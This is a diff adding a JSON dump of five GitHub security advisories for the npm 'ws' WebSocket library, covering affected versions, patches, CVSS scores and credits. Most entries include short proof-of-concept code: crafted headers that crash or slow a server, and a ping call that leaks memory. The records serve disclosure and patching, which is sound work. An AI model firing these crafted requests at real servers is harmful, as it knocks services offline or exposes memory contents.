@@ -1,0 +1,509 @@
+[
+  {
+    "ghsa_id": "GHSA-3h5v-q93c-6h6q",
+    "cve_id": "CVE-2024-37890",
+    "url": "https://api.github.com/advisories/GHSA-3h5v-q93c-6h6q",
+    "html_url": "https://github.com/advisories/GHSA-3h5v-q93c-6h6q",
+    "summary": "ws affected by a DoS when handling a request with many HTTP headers",
+    "description": "### Impact\n\nA request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated in the following ways:\n\n1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.\n2. Set `server.maxHeadersCount` to `0` so that no limit is applied.\n\n### Credits\n\nThe vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.\n\n### References\n\n- https://github.com/websockets/ws/issues/2230\n- https://github.com/websockets/ws/pull/2231\n\n[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize\n[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener\n[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount\n",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/websockets/ws/security-advisories/GHSA-3h5v-q93c-6h6q",
+    "source_code_location": "https://github.com/websockets/ws",
+    "identifiers": [
+      {
+        "value": "GHSA-3h5v-q93c-6h6q",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-37890",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q",
+      "https://github.com/websockets/ws/issues/2230",
+      "https://github.com/websockets/ws/pull/2231",
+      "https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f",
+      "https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e",
+      "https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c",
+      "https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63",
+      "https://github.com/advisories/GHSA-3h5v-q93c-6h6q"
+    ],
+    "published_at": "2024-06-17T19:09:10Z",
+    "updated_at": "2024-08-05T05:02:34Z",
+    "github_reviewed_at": "2024-06-17T19:09:10Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 2.1.0, < 5.2.4",
+        "first_patched_version": "5.2.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 6.0.0, < 6.2.3",
+        "first_patched_version": "6.2.3",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 7.0.0, < 7.5.10",
+        "first_patched_version": "7.5.10",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 8.0.0, < 8.17.1",
+        "first_patched_version": "8.17.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.7
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-476",
+        "name": "NULL Pointer Dereference"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "rrlapointe",
+          "id": 31218229,
+          "node_id": "MDQ6VXNlcjMxMjE4MjI5",
+          "avatar_url": "https://avatars.githubusercontent.com/u/31218229?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/rrlapointe",
+          "html_url": "https://github.com/rrlapointe",
+          "followers_url": "https://api.github.com/users/rrlapointe/followers",
+          "following_url": "https://api.github.com/users/rrlapointe/following{/other_user}",
+          "gists_url": "https://api.github.com/users/rrlapointe/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/rrlapointe/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/rrlapointe/subscriptions",
+          "organizations_url": "https://api.github.com/users/rrlapointe/orgs",
+          "repos_url": "https://api.github.com/users/rrlapointe/repos",
+          "events_url": "https://api.github.com/users/rrlapointe/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/rrlapointe/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    },
+    "epss": {
+      "percentage": 0.00541,
+      "percentile": 0.67505
+    }
+  },
+  {
+    "ghsa_id": "GHSA-6fc8-4gx4-v693",
+    "cve_id": "CVE-2021-32640",
+    "url": "https://api.github.com/advisories/GHSA-6fc8-4gx4-v693",
+    "html_url": "https://github.com/advisories/GHSA-6fc8-4gx4-v693",
+    "summary": "ReDoS in Sec-Websocket-Protocol header",
+    "description": "### Impact\n\nA specially crafted value of the `Sec-Websocket-Protocol` header can be used to significantly slow down a ws server.\n\n### Proof of concept\n\n```js\nfor (const length of [1000, 2000, 4000, 8000, 16000, 32000]) {\n  const value = 'b' + ' '.repeat(length) + 'x';\n  const start = process.hrtime.bigint();\n\n  value.trim().split(/ *, */);\n\n  const end = process.hrtime.bigint();\n\n  console.log('length = %d, time = %f ns', length, end - start);\n}\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@7.4.6 (https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff) and backported to ws@6.2.2 (https://github.com/websockets/ws/commit/78c676d2a1acefbc05292e9f7ea0a9457704bf1b) and ws@5.2.3 (https://github.com/websockets/ws/commit/76d47c1479002022a3e4357b3c9f0e23a68d4cd2).\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated by reducing the maximum allowed length of the request headers using the [`--max-http-header-size=size`](https://nodejs.org/api/cli.html#cli_max_http_header_size_size) and/or the [`maxHeaderSize`](https://nodejs.org/api/http.html#http_http_createserver_options_requestlistener) options.\n\n### Credits\n\nThe vulnerability was responsibly disclosed along with a fix in private by [Robert McLaughlin](https://github.com/robmcl4) from University of California, Santa Barbara.\n",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/websockets/ws/security-advisories/GHSA-6fc8-4gx4-v693",
+    "source_code_location": "https://github.com/websockets/ws",
+    "identifiers": [
+      {
+        "value": "GHSA-6fc8-4gx4-v693",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2021-32640",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/websockets/ws/security/advisories/GHSA-6fc8-4gx4-v693",
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-32640",
+      "https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff",
+      "https://github.com/websockets/ws/issues/1895",
+      "https://lists.apache.org/thread.html/rdfa7b6253c4d6271e31566ecd5f30b7ce1b8fb2c89d52b8c4e0f4e30@%3Ccommits.tinkerpop.apache.org%3E",
+      "https://security.netapp.com/advisory/ntap-20210706-0005/",
+      "https://github.com/advisories/GHSA-6fc8-4gx4-v693"
+    ],
+    "published_at": "2021-05-28T19:19:03Z",
+    "updated_at": "2023-02-03T05:02:42Z",
+    "github_reviewed_at": "2021-05-28T18:18:04Z",
+    "nvd_published_at": "2021-05-25T19:15:00Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 7.0.0, < 7.4.6",
+        "first_patched_version": "7.4.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 6.0.0, < 6.2.2",
+        "first_patched_version": "6.2.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 5.0.0, < 5.2.3",
+        "first_patched_version": "5.2.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-345",
+        "name": "Insufficient Verification of Data Authenticity"
+      },
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "robmcl4",
+          "id": 884115,
+          "node_id": "MDQ6VXNlcjg4NDExNQ==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/884115?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/robmcl4",
+          "html_url": "https://github.com/robmcl4",
+          "followers_url": "https://api.github.com/users/robmcl4/followers",
+          "following_url": "https://api.github.com/users/robmcl4/following{/other_user}",
+          "gists_url": "https://api.github.com/users/robmcl4/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/robmcl4/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/robmcl4/subscriptions",
+          "organizations_url": "https://api.github.com/users/robmcl4/orgs",
+          "repos_url": "https://api.github.com/users/robmcl4/repos",
+          "events_url": "https://api.github.com/users/robmcl4/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/robmcl4/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "score": 5.3
+    },
+    "epss": {
+      "percentage": 0.00452,
+      "percentile": 0.63506
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5v72-xg48-5rpm",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-5v72-xg48-5rpm",
+    "html_url": "https://github.com/advisories/GHSA-5v72-xg48-5rpm",
+    "summary": "Denial of Service in ws",
+    "description": "Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.\n\n## Proof of concept\n\n```\nconst WebSocket = require('ws');\nconst net = require('net');\n\nconst wss = new WebSocket.Server({ port: 3000 }, function () {\n  const payload = 'constructor';  // or ',;constructor'\n\n  const request = [\n    'GET / HTTP/1.1',\n    'Connection: Upgrade',\n    'Sec-WebSocket-Key: test',\n    'Sec-WebSocket-Version: 8',\n    `Sec-WebSocket-Extensions: ${payload}`,\n    'Upgrade: websocket',\n    '\\r\\n'\n  ].join('\\r\\n');\n\n  const socket = net.connect(3000, function () {\n    socket.resume();\n    socket.write(request);\n  });\n});\n```\n\n\n## Recommendation\n\nUpdate to version 3.3.1 or later.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "",
+    "identifiers": [
+      {
+        "value": "GHSA-5v72-xg48-5rpm",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a",
+      "https://www.npmjs.com/advisories/550/versions",
+      "https://www.npmjs.com/advisories/550",
+      "https://snyk.io/vuln/npm:ws:20171108",
+      "https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407",
+      "https://github.com/advisories/GHSA-5v72-xg48-5rpm"
+    ],
+    "published_at": "2019-06-04T19:37:52Z",
+    "updated_at": "2023-03-23T21:34:23Z",
+    "github_reviewed_at": "2019-06-04T19:37:42Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 0.2.6, < 1.1.5",
+        "first_patched_version": "1.1.5",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": ">= 2.0.0, < 3.3.1",
+        "first_patched_version": "3.3.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-6663-c963-2gqg",
+    "cve_id": "CVE-2016-10542",
+    "url": "https://api.github.com/advisories/GHSA-6663-c963-2gqg",
+    "html_url": "https://github.com/advisories/GHSA-6663-c963-2gqg",
+    "summary": "DoS due to excessively large websocket message in ws",
+    "description": "Affected versions of `ws` do not appropriately limit the size of incoming websocket payloads, which may result in a denial of service condition when the node process crashes after receiving a large payload.\n\n\n\n## Recommendation\n\nUpdate to version 1.1.1 or later. \nAlternatively, set the `maxpayload` option for the `ws` server to a value smaller than 256MB.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "",
+    "identifiers": [
+      {
+        "value": "GHSA-6663-c963-2gqg",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2016-10542",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2016-10542",
+      "https://github.com/nodejs/node/issues/7388",
+      "https://github.com/advisories/GHSA-6663-c963-2gqg",
+      "https://www.npmjs.com/advisories/120"
+    ],
+    "published_at": "2019-02-18T23:58:35Z",
+    "updated_at": "2023-01-09T05:02:43Z",
+    "github_reviewed_at": "2020-06-16T21:18:11Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": "< 1.1.1",
+        "first_patched_version": "1.1.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.66075,
+      "percentile": 0.985
+    }
+  },
+  {
+    "ghsa_id": "GHSA-2mhh-w6q8-5hxw",
+    "cve_id": "CVE-2016-10518",
+    "url": "https://api.github.com/advisories/GHSA-2mhh-w6q8-5hxw",
+    "html_url": "https://github.com/advisories/GHSA-2mhh-w6q8-5hxw",
+    "summary": "Remote Memory Disclosure in ws",
+    "description": "Versions of `ws` prior to 1.0.1 are affected by a remote memory disclosure vulnerability.\n\nIn certain rare circumstances, applications which allow users to control the arguments of a `client.ping()` call will cause `ws` to send the contents of an allocated but non-zero-filled buffer to the server. This may disclose sensitive information that still exists in memory after previous use of the memory for other tasks.\n\n\n\n## Proof of Concept\n```\nvar ws = require('ws')\n\nvar server = new ws.Server({ port: 9000 })\nvar client = new ws('ws://localhost:9000')\n\nclient.on('open', function () {\n  console.log('open')\n  client.ping(50) // this sends a non-zeroed buffer of 50 bytes\n\n  client.on('pong', function (data) {\n    console.log('got pong')\n    console.log(data) // Data from the client. \n  })\n})\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.1 or greater.",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": null,
+    "source_code_location": "",
+    "identifiers": [
+      {
+        "value": "GHSA-2mhh-w6q8-5hxw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2016-10518",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2016-10518",
+      "https://gist.github.com/c0nrad/e92005446c480707a74a",
+      "https://github.com/advisories/GHSA-2mhh-w6q8-5hxw",
+      "https://github.com/websockets/ws/releases/tag/1.0.1",
+      "https://www.npmjs.com/advisories/67",
+      "https://github.com/websockets/ws/commit/29293ed11b679e0366fa0f6bb9310b330dafd795"
+    ],
+    "published_at": "2019-02-18T23:56:42Z",
+    "updated_at": "2023-09-18T21:26:42Z",
+    "github_reviewed_at": "2020-06-16T20:52:34Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "ws"
+        },
+        "vulnerable_version_range": "< 1.0.1",
+        "first_patched_version": "1.0.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-201",
+        "name": "Insertion of Sensitive Information Into Sent Data"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "tdunlap607",
+          "id": 16122665,
+          "node_id": "MDQ6VXNlcjE2MTIyNjY1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/16122665?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/tdunlap607",
+          "html_url": "https://github.com/tdunlap607",
+          "followers_url": "https://api.github.com/users/tdunlap607/followers",
+          "following_url": "https://api.github.com/users/tdunlap607/following{/other_user}",
+          "gists_url": "https://api.github.com/users/tdunlap607/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/tdunlap607/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/tdunlap607/subscriptions",
+          "organizations_url": "https://api.github.com/users/tdunlap607/orgs",
+          "repos_url": "https://api.github.com/users/tdunlap607/repos",
+          "events_url": "https://api.github.com/users/tdunlap607/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/tdunlap607/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00345,
+      "percentile": 0.56517
+    }
+  }
+]
